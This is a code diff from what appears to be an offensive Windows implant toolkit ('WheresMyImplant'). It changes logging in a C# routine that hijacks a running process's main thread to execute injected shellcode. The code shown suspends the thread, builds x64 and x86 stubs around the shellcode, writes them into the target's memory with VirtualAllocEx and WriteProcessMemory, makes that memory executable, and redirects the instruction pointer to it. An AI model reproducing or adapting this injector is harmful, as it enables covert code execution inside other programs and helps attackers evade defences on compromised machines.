@@ -3,8 +3,8 @@ using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 
-using Unmanaged.Headers;
-using Unmanaged.Libraries;
+using MonkeyWorks.Unmanaged.Headers;
+using MonkeyWorks.Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
@@ -36,27 +36,27 @@ namespace WheresMyImplant
                 | ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, processId);
             if (IntPtr.Zero == hProcess)
             {
-                WriteOutputBad("OpenProcess Failed");
+                Console.WriteLine("[-] OpenProcess Failed");
                 return;
             }
-            WriteOutputGood(String.Format("Recieved Process Handle: 0x{0}", hProcess.ToString("X4")));
+            Console.WriteLine("[+] Recieved Process Handle: 0x{0}", hProcess.ToString("X4"));
 
             Int32 threadId = Process.GetProcessById((int)processId).Threads[0].Id;
-            WriteOutputGood(String.Format("Main Thread ID: {0}", threadId));
+            Console.WriteLine("[+] Main Thread ID: {0}", threadId);
             hThread = kernel32.OpenThread(
                 ProcessThreadsApi.ThreadSecurityRights.THREAD_GET_CONTEXT |
                 ProcessThreadsApi.ThreadSecurityRights.THREAD_SET_CONTEXT |
                 ProcessThreadsApi.ThreadSecurityRights.THREAD_SUSPEND_RESUME,
                 false,
                 (UInt32)threadId);
-            WriteOutputGood(String.Format("Recieved Thread Handle: 0x{0}", hThread.ToString("X4")));
+            Console.WriteLine("[+] Recieved Thread Handle: 0x{0}", hThread.ToString("X4"));
 
             if (-1 == kernel32.SuspendThread(hThread))
             {
-                WriteOutputBad("SuspendThread Failed");
+                Console.WriteLine("[-] SuspendThread Failed");
                 return;
             }
-            WriteOutputNeutral("Suspended Thread");
+            Console.WriteLine("[*] Suspended Thread");
 
             ////////////////////////////////////////////////////////////////////////////////
             // x64 Target Process
@@ -67,11 +67,11 @@ namespace WheresMyImplant
                 context.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;
                 if (!kernel32.GetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("GetThreadContext (64) Failed");
+                    Console.WriteLine("[-] GetThreadContext (64) Failed");
                     return;
                 }
-                WriteOutputNeutral("Retrieving Thread Context");
-                WriteOutputNeutral(String.Format("Original RIP: 0x{0}", context.Rip.ToString("X4")));
+                Console.WriteLine("[*] Retrieving Thread Context");
+                Console.WriteLine("[*] Original RIP: 0x{0}", context.Rip.ToString("X4"));
 
                 System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                 stub = stub.Concat(shellcode);
@@ -80,20 +80,20 @@ namespace WheresMyImplant
                 stub = stub.Concat(new Byte[] { 0xff, 0xe0 }); // JMP RAX
 
                 context.Rip = (UInt64)AllocateAndWriteMemory(stub.ToArray());
-                WriteOutputGood(String.Format("Updated RIP: 0x{0}", context.Rip.ToString("X4")));
+                Console.WriteLine("[+] Updated RIP: 0x{0}", context.Rip.ToString("X4"));
 
                 if (!kernel32.SetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("SetThreadContext (64) Failed");
+                    Console.WriteLine("[-] SetThreadContext (64) Failed");
                     return;
                 }
 
                 if (!kernel32.GetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("GetThreadContext(2) (32) Failed");
+                    Console.WriteLine("[-] GetThreadContext(2) (32) Failed");
                     return;
                 }
-                WriteOutputNeutral(String.Format("Checking RIP: 0x{0}", context.Rip.ToString("X4")));
+                Console.WriteLine("[*] Checking RIP: 0x{0}", context.Rip.ToString("X4"));
             }
             ////////////////////////////////////////////////////////////////////////////////
             // x86 Target Process
@@ -104,12 +104,12 @@ namespace WheresMyImplant
                 context.ContextFlags = Winnt.CONTEXT_FLAGS.CONTEXT_ALL;
                 if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("GetThreadContext (32) Failed");
+                    Console.WriteLine("[-] GetThreadContext (32) Failed");
 
                     return;
                 }
-                WriteOutputNeutral("Retrieving Thread Context");
-                WriteOutputNeutral(String.Format("Original EIP: 0x{0}", context.Eip.ToString("X4")));
+                Console.WriteLine("[*] Retrieving Thread Context");
+                Console.WriteLine("[*] Original EIP: 0x{0}", context.Eip.ToString("X4"));
 
                 System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                 stub = stub.Concat(new Byte[] { 0x68 }); // PUSH...
@@ -119,24 +119,24 @@ namespace WheresMyImplant
                 stub = stub.Concat(new Byte[] { 0x9D, 0x61, 0xC3 }); // POPFD POPAD RET
 
                 context.Eip = (UInt32)AllocateAndWriteMemory(stub.ToArray());
-                WriteOutputGood(String.Format("Updated EIP: 0x{0}", context.Eip.ToString("X4")));
+                Console.WriteLine("[+] Updated EIP: 0x{0}", context.Eip.ToString("X4"));
 
                 if (!kernel32.Wow64SetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("SetThreadContext (32) Failed");
+                    Console.WriteLine("[-] SetThreadContext (32) Failed");
                     return;
 
                 }
-                WriteOutputGood("Updated Thread Context");
+                Console.WriteLine("[+] Updated Thread Context");
 
                 if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                 {
-                    WriteOutputBad("GetThreadContext(2) (32) Failed");
+                    Console.WriteLine("[-] GetThreadContext(2) (32) Failed");
                     return;
                 }
-                WriteOutputNeutral(String.Format("Checking EIP: 0x{0}", context.Eip.ToString("X4"))); 
+                Console.WriteLine("[*] Checking EIP: 0x{0}", context.Eip.ToString("X4")); 
             }
-            WriteOutputNeutral("Resuming Thread");
+            Console.WriteLine("[*] Resuming Thread");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -149,28 +149,28 @@ namespace WheresMyImplant
             IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, bufferLength, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
             if (IntPtr.Zero == lpBaseAddress)
             {
-                WriteOutputBad("VirtualAllocEx Failed");
+                Console.WriteLine("[-] VirtualAllocEx Failed");
                 return IntPtr.Zero;
             }
-            WriteOutputGood(String.Format("Allocated {0} Bytes at 0x{1}", bufferLength, lpBaseAddress.ToString("X4")));
-            WriteOutputGood(String.Format("Memory Protections Set to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE));
+            Console.WriteLine("[+] Allocated {0} Bytes at 0x{1}", bufferLength, lpBaseAddress.ToString("X4"));
+            Console.WriteLine("[+] Memory Protections Set to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE);
 
             UInt32 lpNumberOfBytesWritten = 0;
             kernel32.WriteProcessMemory(hProcess, lpBaseAddress, buffer, bufferLength, ref lpNumberOfBytesWritten);
             if (0 == lpNumberOfBytesWritten)
             {
-                WriteOutputBad("WriteProcessMemory Failed");
+                Console.WriteLine("[-] WriteProcessMemory Failed");
                 return IntPtr.Zero;
             }
-            WriteOutputGood(String.Format("Wrote {0} Bytes", lpNumberOfBytesWritten));
+            Console.WriteLine("[+] Wrote {0} Bytes", lpNumberOfBytesWritten);
             
             var oldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE;
             if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, bufferLength, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref oldProtect))
             {
-                WriteOutputBad("VirtualProtectEx Failed");
+                Console.WriteLine("[-] VirtualProtectEx Failed");
                 return IntPtr.Zero;
             }
-            WriteOutputGood(String.Format("Memory Protections Updated to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ));          
+            Console.WriteLine("[+] Memory Protections Updated to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ);          
 
             return lpBaseAddress;
         }
